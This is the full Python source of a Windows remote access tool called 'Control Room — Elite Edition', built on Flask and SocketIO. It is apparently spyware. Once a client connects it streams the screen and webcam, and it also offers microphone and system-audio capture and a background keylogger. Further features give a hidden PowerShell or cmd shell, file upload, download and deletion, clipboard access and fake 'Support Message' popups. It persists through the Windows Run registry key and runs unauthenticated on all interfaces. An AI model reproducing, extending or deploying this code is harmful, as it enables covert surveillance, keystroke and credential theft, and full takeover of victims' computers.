from flask import Flask, render_template, request, send_file, Response
from flask_socketio import SocketIO, emit
import cv2
import numpy as np
import pyautogui
import mss
import base64
import json
import os
import sys
import subprocess
import signal
import ctypes
import psutil
import pyperclip
import io
import threading
import time
import queue
import struct
from datetime import datetime
from PIL import Image
import winreg

# --- Optional imports ---
try:
    import sounddevice as sd
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    print("[WARN] sounddevice not installed — audio streaming disabled")

try:
    from pynput import keyboard as pynput_keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False
    print("[WARN] pynput not installed — keylogger disabled")

try:
    import GPUtil
    GPU_AVAILABLE = True
except ImportError:
    GPU_AVAILABLE = False

# ============================================================
#  Flask App
# ============================================================
app = Flask(__name__)
app.config['SECRET_KEY'] = 'sk-hackerai-supersecret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet',
                    max_http_buffer_size=50 * 1024 * 1024,  # 50 MB for file uploads
                    logger=False, engineio_logger=False)

# ============================================================
#  Globals
# ============================================================
sct = mss.mss()
screen_size = None
webcam = None
frame_queue = queue.Queue(maxsize=2)
is_capturing = False
current_monitor = 1  # mss monitor index (0 = all, 1 = primary, 2+ = secondary)

# Terminal
terminal_processes = {}  # sid -> subprocess.Popen

# Audio
audio_stream = None
audio_thread = None
is_audio_streaming = False

# Keylogger
keylog_data = []
keylog_listener = None
keylog_lock = threading.Lock()
KEYLOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keylog.json')

# Chat
chat_history = []

# ============================================================
#  Mouse & Keyboard Controllers (existing)
# ============================================================
class MouseController:
    @staticmethod
    def move(x, y):
        pyautogui.moveTo(x, y)
    
    @staticmethod
    def click(button='left'):
        pyautogui.click(button=button)
    
    @staticmethod
    def double_click():
        pyautogui.doubleClick()
    
    @staticmethod
    def right_click():
        pyautogui.rightClick()
    
    @staticmethod
    def scroll(amount):
        pyautogui.scroll(amount)
    
    @staticmethod
    def drag(x1, y1, x2, y2):
        pyautogui.moveTo(x1, y1)
        pyautogui.dragTo(x2, y2, duration=0)

class KeyboardController:
    @staticmethod
    def press(key):
        pyautogui.press(key)
    
    @staticmethod
    def typewrite(text, interval=0.01):
        pyautogui.typewrite(text, interval)
    
    @staticmethod
    def hotkey(*args):
        pyautogui.hotkey(*args)

# ============================================================
#  Screen Capture
# ============================================================
def get_screen():
    monitor = sct.monitors[current_monitor]
    raw_img = sct.grab(monitor)
    img = Image.frombytes("RGB", raw_img.size, raw_img.rgb)
    return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

def screen_capture_loop():
    global screen_size, is_capturing
    screen_size = sct.monitors[current_monitor]
    
    while is_capturing:
        try:
            frame = get_screen()
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 75]
            result, encimg = cv2.imencode('.jpg', frame, encode_param)
            
            if result:
                frame_data = base64.b64encode(encimg).decode('utf-8')
                socketio.emit('screen_frame', {
                    'image': frame_data,
                    'width': screen_size['width'],
                    'height': screen_size['height'],
                    'timestamp': time.time()
                })
            
            time.sleep(1/30)  # 30 FPS for stability
            
        except Exception as e:
            print(f"Capture error: {e}")
            time.sleep(0.1)

def webcam_loop():
    global webcam
    webcam = cv2.VideoCapture(0)
    webcam.set(cv2.CAP_PROP_FRAME_WIDTH, 320)
    webcam.set(cv2.CAP_PROP_FRAME_HEIGHT, 240)
    
    while is_capturing:
        ret, frame = webcam.read()
        if ret:
            ret, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
            socketio.emit('webcam_frame', {
                'image': base64.b64encode(buffer).decode(),
                'timestamp': time.time()
            })
        time.sleep(1/15)

# ============================================================
#  1. REMOTE FILE EXPLORER
# ============================================================
@socketio.on('file_browse')
def handle_file_browse(data):
    path = data.get('path', os.path.expanduser('~'))
    try:
        if not os.path.exists(path):
            emit('file_list', {'error': f'Path not found: {path}'})
            return
        
        entries = []
        for entry in os.scandir(path):
            try:
                stat = entry.stat()
                entries.append({
                    'name': entry.name,
                    'path': entry.path.replace('\\', '/'),
                    'is_dir': entry.is_dir(),
                    'size': stat.st_size if not entry.is_dir() else 0,
                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                })
            except (PermissionError, OSError):
                entries.append({
                    'name': entry.name,
                    'path': entry.path.replace('\\', '/'),
                    'is_dir': entry.is_dir(),
                    'size': 0,
                    'modified': '',
                    'error': 'Access denied'
                })
        
        entries.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
        
        emit('file_list', {
            'path': path.replace('\\', '/'),
            'parent': os.path.dirname(path).replace('\\', '/'),
            'entries': entries
        })
    except PermissionError:
        emit('file_list', {'error': f'Access denied: {path}'})

@app.route('/download')
def download_file():
    path = request.args.get('path', '')
    if os.path.isfile(path):
        return send_file(path, as_attachment=True)
    return {'error': 'File not found'}, 404

@socketio.on('file_upload')
def handle_file_upload(data):
    try:
        path = data['path']
        content = base64.b64decode(data['content'])
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'wb') as f:
            f.write(content)
        emit('file_upload_status', {'success': True, 'path': path})
    except Exception as e:
        emit('file_upload_status', {'success': False, 'error': str(e)})

@socketio.on('file_delete')
def handle_file_delete(data):
    try:
        path = data['path']
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            import shutil
            shutil.rmtree(path)
        emit('file_delete_status', {'success': True, 'path': path})
    except Exception as e:
        emit('file_delete_status', {'success': False, 'error': str(e)})

# ============================================================
#  2. INTERACTIVE TERMINAL
# ============================================================
@socketio.on('terminal_start')
def handle_terminal_start(data):
    sid = request.sid
    shell = data.get('shell', 'powershell')
    
    if sid in terminal_processes:
        try:
            terminal_processes[sid].terminate()
        except:
            pass
    
    shell_cmd = 'powershell.exe' if shell == 'powershell' else 'cmd.exe'
    
    try:
        proc = subprocess.Popen(
            shell_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW,
            bufsize=0
        )
        terminal_processes[sid] = proc
        
        def read_output():
            while proc.poll() is None:
                try:
                    chunk = proc.stdout.read(4096)
                    if chunk:
                        socketio.emit('terminal_output', {
                            'output': chunk.decode('utf-8', errors='replace')
                        }, to=sid)
                except:
                    break
            socketio.emit('terminal_output', {
                'output': '\r\n[Process exited]\r\n'
            }, to=sid)
        
        threading.Thread(target=read_output, daemon=True).start()
        emit('terminal_started', {'shell': shell})
    except Exception as e:
        emit('terminal_output', {'output': f'Error starting terminal: {e}\r\n'})

@socketio.on('terminal_input')
def handle_terminal_input(data):
    sid = request.sid
    if sid in terminal_processes:
        proc = terminal_processes[sid]
        if proc.poll() is None:
            try:
                proc.stdin.write((data['input'] + '\n').encode('utf-8'))
                proc.stdin.flush()
            except:
                pass

@socketio.on('terminal_stop')
def handle_terminal_stop():
    sid = request.sid
    if sid in terminal_processes:
        try:
            terminal_processes[sid].terminate()
        except:
            pass
        del terminal_processes[sid]

# ============================================================
#  3. PROCESS MANAGER
# ============================================================
@socketio.on('process_list')
def handle_process_list():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'status', 'username']):
        try:
            info = proc.info
            processes.append({
                'pid': info['pid'],
                'name': info['name'],
                'cpu': round(info['cpu_percent'] or 0, 1),
                'ram': round((info['memory_info'].rss / 1024 / 1024) if info['memory_info'] else 0, 1),
                'status': info['status'],
                'user': info['username'] or 'SYSTEM'
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    processes.sort(key=lambda x: x['cpu'], reverse=True)
    emit('process_data', {'processes': processes[:200]})  # Top 200

@socketio.on('process_kill')
def handle_process_kill(data):
    try:
        pid = data['pid']
        proc = psutil.Process(pid)
        proc.terminate()
        emit('process_kill_status', {'success': True, 'pid': pid})
    except Exception as e:
        emit('process_kill_status', {'success': False, 'error': str(e)})

# ============================================================
#  4. AUDIO STREAMING (sounddevice)
# ============================================================
@socketio.on('audio_start')
def handle_audio_start(data):
    global audio_stream, audio_thread, is_audio_streaming
    
    if not AUDIO_AVAILABLE:
        emit('audio_error', {'error': 'sounddevice not installed on host'})
        return
    
    if is_audio_streaming:
        return
    
    source = data.get('source', 'mic')  # 'mic' or 'system'
    is_audio_streaming = True
    
    def stream_audio():
        global is_audio_streaming, audio_stream
        try:
            device_index = None
            if source == 'system':
                # Try to find loopback / stereo mix device
                devices = sd.query_devices()
                for i, dev in enumerate(devices):
                    name = dev['name'].lower()
                    if ('loopback' in name or 'stereo mix' in name) and dev['max_input_channels'] > 0:
                        device_index = i
                        break
            
            sample_rate = 16000
            block_size = 1024
            
            def audio_callback(indata, frames, time_info, status):
                if not is_audio_streaming:
                    return
                # Convert float32 to int16 bytes
                audio_int16 = (indata[:, 0] * 32767).astype(np.int16)
                audio_bytes = audio_int16.tobytes()
                socketio.emit('audio_chunk', {
                    'data': base64.b64encode(audio_bytes).decode('utf-8'),
                    'sample_rate': sample_rate,
                    'channels': 1
                })
            
            audio_stream = sd.InputStream(
                samplerate=sample_rate,
                blocksize=block_size,
                channels=1,
                dtype='float32',
                device=device_index,
                callback=audio_callback
            )
            audio_stream.start()
            
            # Keep thread alive while streaming
            while is_audio_streaming:
                time.sleep(0.1)
            
            audio_stream.stop()
            audio_stream.close()
        except Exception as e:
            socketio.emit('audio_error', {'error': str(e)})
            is_audio_streaming = False
    
    audio_thread = threading.Thread(target=stream_audio, daemon=True)
    audio_thread.start()
    emit('audio_started', {'source': source})

@socketio.on('audio_stop')
def handle_audio_stop():
    global is_audio_streaming
    is_audio_streaming = False
    emit('audio_stopped', {})

# ============================================================
#  5. SYSTEM VITALS
# ============================================================
vitals_active = {}

@socketio.on('vitals_start')
def handle_vitals_start():
    sid = request.sid
    vitals_active[sid] = True
    
    def send_vitals():
        while vitals_active.get(sid, False):
            try:
                cpu_percent = psutil.cpu_percent(interval=0)
                cpu_per_core = psutil.cpu_percent(percpu=True)
                mem = psutil.virtual_memory()
                disk = psutil.disk_usage('/')
                net = psutil.net_io_counters()
                
                vitals = {
                    'cpu': cpu_percent,
                    'cpu_cores': cpu_per_core,
                    'ram_used': round(mem.used / 1024 / 1024 / 1024, 2),
                    'ram_total': round(mem.total / 1024 / 1024 / 1024, 2),
                    'ram_percent': mem.percent,
                    'disk_used': round(disk.used / 1024 / 1024 / 1024, 1),
                    'disk_total': round(disk.total / 1024 / 1024 / 1024, 1),
                    'disk_percent': disk.percent,
                    'net_sent': round(net.bytes_sent / 1024 / 1024, 1),
                    'net_recv': round(net.bytes_recv / 1024 / 1024, 1),
                    'timestamp': time.time()
                }
                
                if GPU_AVAILABLE:
                    try:
                        gpus = GPUtil.getGPUs()
                        if gpus:
                            gpu = gpus[0]
                            vitals['gpu_name'] = gpu.name
                            vitals['gpu_load'] = round(gpu.load * 100, 1)
                            vitals['gpu_temp'] = gpu.temperature
                            vitals['gpu_mem_used'] = round(gpu.memoryUsed, 1)
                            vitals['gpu_mem_total'] = round(gpu.memoryTotal, 1)
                    except:
                        pass
                
                socketio.emit('vitals_update', vitals, to=sid)
            except Exception as e:
                print(f"Vitals error: {e}")
            
            time.sleep(1)
    
    threading.Thread(target=send_vitals, daemon=True).start()

@socketio.on('vitals_stop')
def handle_vitals_stop():
    vitals_active[request.sid] = False

# ============================================================
#  6. KEYLOGGER VAULT
# ============================================================
def start_keylogger():
    global keylog_listener
    if not KEYLOGGER_AVAILABLE:
        return
    
    # Load existing keylog
    global keylog_data
    if os.path.exists(KEYLOG_FILE):
        try:
            with open(KEYLOG_FILE, 'r') as f:
                keylog_data = json.load(f)
        except:
            keylog_data = []
    
    def on_press(key):
        try:
            key_str = key.char if hasattr(key, 'char') and key.char else str(key).replace('Key.', '')
        except AttributeError:
            key_str = str(key).replace('Key.', '')
        
        entry = {
            'key': key_str,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
            'timestamp': time.time()
        }
        
        with keylog_lock:
            keylog_data.append(entry)
            # Save every 50 keystrokes
            if len(keylog_data) % 50 == 0:
                save_keylog()
    
    keylog_listener = pynput_keyboard.Listener(on_press=on_press)
    keylog_listener.daemon = True
    keylog_listener.start()

def save_keylog():
    try:
        with open(KEYLOG_FILE, 'w') as f:
            json.dump(keylog_data, f)
    except:
        pass

@socketio.on('keylog_fetch')
def handle_keylog_fetch(data=None):
    search = ''
    if data:
        search = data.get('search', '')
    
    with keylog_lock:
        if search:
            filtered = [e for e in keylog_data if search.lower() in e['key'].lower()]
        else:
            filtered = keylog_data[-500:]  # Last 500 entries
    
    emit('keylog_data', {'entries': filtered, 'total': len(keylog_data)})

@socketio.on('keylog_clear')
def handle_keylog_clear():
    global keylog_data
    with keylog_lock:
        keylog_data = []
        save_keylog()
    emit('keylog_cleared', {})

# ============================================================
#  7. MULTI-MONITOR SUPPORT
# ============================================================
@socketio.on('monitor_list')
def handle_monitor_list():
    monitors = []
    for i, m in enumerate(sct.monitors):
        if i == 0:
            continue  # Skip "all monitors" entry
        monitors.append({
            'index': i,
            'width': m['width'],
            'height': m['height'],
            'left': m['left'],
            'top': m['top'],
            'primary': i == 1
        })
    emit('monitor_data', {'monitors': monitors, 'current': current_monitor})

@socketio.on('monitor_switch')
def handle_monitor_switch(data):
    global current_monitor, screen_size
    idx = data.get('index', 1)
    if 1 <= idx < len(sct.monitors):
        current_monitor = idx
        screen_size = sct.monitors[current_monitor]
        emit('monitor_switched', {'index': idx, 'size': screen_size})

# ============================================================
#  8. UNIVERSAL CLIPBOARD
# ============================================================
@socketio.on('clipboard_get')
def handle_clipboard_get():
    try:
        content = pyperclip.paste()
        emit('clipboard_content', {'content': content})
    except Exception as e:
        emit('clipboard_content', {'error': str(e)})

@socketio.on('clipboard_set')
def handle_clipboard_set(data):
    try:
        pyperclip.copy(data['content'])
        emit('clipboard_status', {'success': True})
    except Exception as e:
        emit('clipboard_status', {'success': False, 'error': str(e)})

# ============================================================
#  9. SUPPORT CHAT
# ============================================================
@socketio.on('chat_send')
def handle_chat_send(data):
    message = data.get('message', '')
    msg_entry = {
        'from': 'admin',
        'message': message,
        'time': datetime.now().strftime('%H:%M:%S')
    }
    chat_history.append(msg_entry)
    
    # Show popup on host machine
    def show_popup():
        try:
            ctypes.windll.user32.MessageBoxW(
                0,
                message,
                "💬 Support Message",
                0x00000040 | 0x00001000  # MB_ICONINFORMATION | MB_SYSTEMMODAL
            )
        except:
            pass
    
    threading.Thread(target=show_popup, daemon=True).start()
    emit('chat_received', msg_entry, broadcast=True)

@socketio.on('chat_history')
def handle_chat_history():
    emit('chat_data', {'messages': chat_history})

# ============================================================
#  10. SYSTEM ALERTS
# ============================================================
@socketio.on('alert_send')
def handle_alert_send(data):
    title = data.get('title', 'System Alert')
    message = data.get('message', '')
    icon = data.get('icon', 'info')  # info, warning, error
    
    icon_flags = {
        'info': 0x00000040,       # MB_ICONINFORMATION
        'warning': 0x00000030,    # MB_ICONWARNING
        'error': 0x00000010       # MB_ICONERROR
    }
    
    def show_alert():
        try:
            ctypes.windll.user32.MessageBoxW(
                0, message, title,
                icon_flags.get(icon, 0x00000040) | 0x00001000
            )
        except:
            pass
    
    threading.Thread(target=show_alert, daemon=True).start()
    emit('alert_sent', {'success': True})

# ============================================================
#  Connection Handlers
# ============================================================
@socketio.on('connect')
def handle_connect():
    global is_capturing
    print(f"🔥 CONTROL ROOM CONNECTED: {request.sid}")
    is_capturing = True
    
    emit('init', {
        'screen_size': sct.monitors[current_monitor],
        'status': 'online',
        'audio_available': AUDIO_AVAILABLE,
        'keylogger_available': KEYLOGGER_AVAILABLE,
        'gpu_available': GPU_AVAILABLE,
        'monitors': len(sct.monitors) - 1
    })
    
    threading.Thread(target=screen_capture_loop, daemon=True).start()
    threading.Thread(target=webcam_loop, daemon=True).start()

@socketio.on('disconnect')
def handle_disconnect():
    global is_capturing
    sid = request.sid
    print(f"❌ Client disconnected: {sid}")
    is_capturing = False
    vitals_active.pop(sid, None)
    
    # Clean up terminal
    if sid in terminal_processes:
        try:
            terminal_processes[sid].terminate()
        except:
            pass
        del terminal_processes[sid]

@socketio.on('mouse')
def handle_mouse(data):
    if data['type'] == 'move':
        MouseController.move(data['x'], data['y'])
    elif data['type'] == 'click':
        MouseController.click(data.get('button', 'left'))
    elif data['type'] == 'dblclick':
        MouseController.double_click()
    elif data['type'] == 'rightclick':
        MouseController.right_click()
    elif data['type'] == 'scroll':
        MouseController.scroll(data.get('amount', 0))
    elif data['type'] == 'drag':
        MouseController.drag(data['x1'], data['y1'], data['x2'], data['y2'])

@socketio.on('keyboard')
def handle_keyboard(data):
    if data['type'] == 'press':
        KeyboardController.press(data['key'])
    elif data['type'] == 'type':
        threading.Thread(target=KeyboardController.typewrite, args=(data['text'],), daemon=True).start()
    elif data['type'] == 'hotkey':
        KeyboardController.hotkey(*data['keys'])

@socketio.on('system')
def handle_system(data):
    if data['cmd'] == 'screenshot':
        frame = get_screen()
        _, buffer = cv2.imencode('.png', frame)
        emit('screenshot', {'image': base64.b64encode(buffer).decode()})

# ============================================================
#  Routes
# ============================================================
@app.route('/')
def control_room():
    return render_template('control.html')

@app.route('/status')
def status():
    return {
        'online': is_capturing,
        'screen_size': screen_size,
        'fps': 30,
        'monitor_count': len(sct.monitors) - 1,
        'audio': AUDIO_AVAILABLE,
        'keylogger': KEYLOGGER_AVAILABLE
    }

# ============================================================
#  Main
# ============================================================
def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
        
        python_exe = sys.executable.replace("python.exe", "pythonw.exe") # Run without hanging console if pythonw exists
        script_path = os.path.abspath(__file__)
        command = f'"{python_exe}" "{script_path}"'
        
        winreg.SetValueEx(open_key, "ControlRoomElite", 0, winreg.REG_SZ, command)
        winreg.CloseKey(open_key)
        print("  🔄 Startup Persistence: ✅")
    except Exception as e:
        print(f"  🔄 Startup Persistence: ❌ ({e})")

if __name__ == '__main__':
    pyautogui.FAILSAFE = False
    
    # Start keylogger in background
    start_keylogger()
    
    print("=" * 60)
    print("  🔥 CONTROL ROOM — ELITE EDITION")
    add_to_startup()
    print("  📡 http://0.0.0.0:8080")
    print(f"  🖥️  Monitors: {len(sct.monitors) - 1}")
    print(f"  🎙️  Audio: {'✅' if AUDIO_AVAILABLE else '❌'}")
    print(f"  ⌨️  Keylogger: {'✅' if KEYLOGGER_AVAILABLE else '❌'}")
    print(f"  🎮  GPU: {'✅' if GPU_AVAILABLE else '❌'}")
    print("=" * 60)
    
    socketio.run(app, host='0.0.0.0', port=8080, debug=False, allow_unsafe_werkzeug=True)